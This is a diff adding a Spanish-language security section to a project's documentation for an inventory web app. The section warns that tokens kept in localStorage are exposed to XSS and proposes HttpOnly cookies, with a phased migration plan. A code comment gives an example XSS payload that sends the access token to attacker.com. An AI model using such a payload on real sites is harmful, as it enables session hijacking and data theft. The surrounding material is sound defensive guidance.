@@ -640,6 +640,114 @@ channel.bind('SALES_COMPLETED', (data) => {
 ### **Validación de Formularios**
 ```typescript
 // utils/onboarding.schemas.ts usa Zod
+```
+
+---
+
+## 🔐 CIBERSEGURIDAD: Experticia del Agente IA
+
+### 🚨 Capacidades de Seguridad Informática
+
+**Este agente cuenta con experticia CRÍTICA en ciberseguridad web y puede:**
+
+- ✅ **Identificar vulnerabilidades de seguridad** en autenticación, almacenamiento de datos, y transporte
+- ✅ **Prevenir ataques críticos:** XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), token theft, session hijacking
+- ✅ **Implementar soluciones de seguridad** basadas en OWASP y estándares de industria
+- ✅ **Auditar código** para detectar fatalidades en seguridad informática
+- ✅ **Recomendar mejores prácticas** de autenticación, criptografía y protección de datos sensibles
+- ✅ **Evaluar riesgos** de seguridad en arquitecturas web modernas
+
+### 🚨 VULNERABILIDAD CRÍTICA IDENTIFICADA: localStorage + XSS
+
+**ESTADO ACTUAL:** ❌ INSEGURO
+
+```typescript
+// ❌ PROBLEMA ACTUAL EN nurax_inventario:
+localStorage.setItem('access_token', token)      // ← VULNERABLE A XSS
+localStorage.setItem('refresh_token', token)    // ← ROBO DE TOKEN
+
+// Escenario de ataque:
+// 1. XSS inyectado: <img onerror="fetch('https://attacker.com?t='+localStorage.getItem('access_token'))">
+// 2. Token robado → Atacante impersona usuario completamente
+// 3. Acceso a: inventario, ventas, clientes, datos confidenciales
+```
+
+**IMPACTO:**
+- 🔴 **CRÍTICA:** Robo de identidad de usuario
+- 🔴 **CRÍTICA:** Acceso no autorizado a datos de negocio
+- 🔴 **CRÍTICA:** Manipulación de inventario y ventas
+- 🔴 **CRÍTICA:** Exfiltración de datos de clientes
+
+### ✅ SOLUCIÓN RECOMENDADA: HttpOnly + Secure Cookies
+
+**Estado:** RECOMENDADO para implementación urgente
+
+```http
+Set-Cookie: access_token=eyJhbGci...; 
+  HttpOnly;           /* ← NO accesible desde JavaScript */
+  Secure;             /* ← Solo HTTPS */
+  SameSite=Strict;    /* ← Previene CSRF */
+  Max-Age=3600;       /* ← 1 hora de expiración */
+  Path=/api;
+```
+
+**Ventajas:**
+- ✅ Token NO accesible desde JavaScript (inmune a XSS)
+- ✅ Enviado automáticamente por navegador (conveniencia)
+- ✅ Protección contra CSRF con SameSite
+- ✅ Expiración controlada por servidor
+- ✅ Requiere HTTPS (Secure flag)
+
+**Documentación Completa:** Ver [AUTH_SECURITY_BEST_PRACTICES.md](./AUTH_SECURITY_BEST_PRACTICES.md)
+- Análisis detallado de vulnerabilidades
+- Implementación backend (Django)
+- Implementación frontend (Vue)
+- Checklist de seguridad
+- Pruebas de validación
+
+### 🔄 Flujo Seguro Esperado (Post-Implementación)
+
+```
+1. LOGIN (Usuario)
+   ├─ POST /auth/login { email, password }
+   └─ Backend: Set-Cookie: access_token (HttpOnly)
+
+2. REQUESTS AUTOMÁTICOS
+   ├─ Frontend NO toca el token (está en cookie)
+   ├─ Browser envía cookie automáticamente
+   └─ Backend valida JWT en cookie
+
+3. REFRESH AUTOMÁTICO (si 401)
+   ├─ Backend genera nuevo access_token
+   ├─ Set-Cookie: access_token (nuevo)
+   └─ Original request reintentada
+
+4. LOGOUT
+   ├─ Backend: Set-Cookie: access_token; Max-Age=0;
+   └─ Cookie expirada inmediatamente
+```
+
+### 📋 Próximos Pasos
+
+**Fase 1 (Backend - Django):** 
+- [ ] Crear `auth_utils.py` con `login_with_cookies()`
+- [ ] Actualizar `AuthenticationBackend` → `CookieJWTAuthentication`
+- [ ] Configurar settings.py (CSRF, SESSION, SECURE flags)
+
+**Fase 2 (Frontend - Vue):**
+- [ ] Actualizar `api.ts` → `credentials: 'include'`
+- [ ] Remover localStorage token handling
+- [ ] Simplificar `useAuth.ts`
+
+**Fase 3 (Validación):**
+- [ ] Verificar localStorage vacío
+- [ ] Testear HttpOnly en DevTools
+- [ ] Testear XSS injection → verificar que NO se roba token
+- [ ] Load testing
+
+---
+
+⚠️ **NOTA CRÍTICA:** Este cambio es URGENTE para la seguridad de datos de usuarios y negocio.
 import { z } from 'zod'
 
 const ProductSchema = z.object({
